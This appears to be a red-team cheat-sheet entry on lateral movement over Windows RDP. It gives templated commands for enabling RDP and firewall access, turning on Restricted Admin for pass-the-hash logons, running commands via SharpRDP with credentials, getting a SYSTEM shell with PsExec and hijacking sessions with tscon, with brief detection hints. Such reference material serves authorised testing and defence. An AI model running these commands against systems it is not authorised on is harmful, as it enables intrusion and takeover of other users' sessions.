---
technique: RDP
category: lateral-movement
targets: Windows Workstation, Windows Server
protocols: RDP
remote_capable: true
tags: windows rdp restricted-admin sharprdp lateral-movement
---

# RDP

Remote Desktop Protocol provides interactive Windows logon and, with Restricted Admin mode, can support pass-the-hash style access without sending the plaintext password to the target.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network access | TCP 3389 must be reachable |
| Logon rights | The user must be allowed to log on through Remote Desktop Services |
| Firewall rule | Windows Firewall must allow inbound RDP |
| Session hijack | tscon session switching requires SYSTEM on the host |

## Windows

### Enable RDP

#cmd #rdp

Enable Remote Desktop connections through the registry.

```cmd title:"Enable Remote Desktop connections"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
<!-- cheat -->

### Allow RDP firewall rule

#cmd #firewall

Allow inbound RDP through Windows Firewall.

```cmd title:"Allow inbound RDP through Windows Firewall"
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow program="%SystemRoot%\system32\svchost.exe" service="TermService" enable=yes profile=private,domain localport=3389 protocol=tcp
```
<!-- cheat -->

### Enable Restricted Admin

#powershell #restricted-admin

Enable Restricted Admin mode for RDP.

```powershell title:"Enable RDP Restricted Admin mode"
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWord -Force
```
<!-- cheat -->

### Disable Restricted Admin

#powershell #restricted-admin

Disable Restricted Admin mode.

```powershell title:"Disable RDP Restricted Admin mode"
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
```
<!-- cheat -->

### Execute over RDP with SharpRDP

#cmd #sharprdp

Execute a command through RDP using SharpRDP.

```cmd title:"Execute command over RDP with SharpRDP"
SharpRDP.exe computername="$rhost_name" command="$command" username="$domain\$user" password="$pass"
```
<!-- cheat
var rhost_name
var command
var domain
var user
var pass
-->

### Spawn SYSTEM shell with PsExec

#cmd #psexec #rdp-hijack

Open a SYSTEM shell before switching RDP sessions.

```cmd title:"Open SYSTEM shell with PsExec"
psexec.exe -s cmd.exe
```
<!-- cheat -->

### List RDP sessions

#cmd #rdp-hijack

List logged-on desktop sessions on the host.

```cmd title:"List RDP sessions"
query user
```
<!-- cheat -->

### List sessions with qwinsta

#cmd #rdp-hijack

List terminal sessions with qwinsta.

```cmd title:"List terminal sessions with qwinsta"
qwinsta
```
<!-- cheat -->

### Switch RDP session

#cmd #rdp-hijack

Reconnect the console to another desktop session from a SYSTEM shell.

```cmd title:"Switch console to RDP session"
tscon $session_id /dest:console
```
<!-- cheat
var session_id
-->

## Linux

### NetExec qwinsta

#netexec #rdp #session-enum

Query remote RDP sessions over SMB with NetExec.

```sh title:"Query remote sessions with NetExec"
nxc smb "$rhost_name" -u "$user" $auth_flags --qwinsta
```
<!-- cheat
var rhost_name
import users
import nxc_auth
-->

## Detection

Watch for tscon.exe running as SYSTEM and Event IDs 4778 and 4779 showing session reconnects and disconnects.
